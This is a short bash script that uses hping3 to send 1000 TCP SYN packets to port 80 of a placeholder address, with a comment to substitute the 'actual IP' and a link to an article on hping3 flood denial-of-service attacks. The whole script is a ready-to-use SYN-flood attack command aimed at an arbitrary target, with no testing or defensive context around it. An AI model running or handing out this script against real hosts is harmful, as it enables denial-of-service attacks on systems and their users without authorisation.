#! /bin/bash
# Replace 127.0.0.1 with actual IP
hping3 -S -p 80 -c 1000 127.0.0.1

# https://shouts.dev/articles/how-to-install-hping3-flood-dos-attack
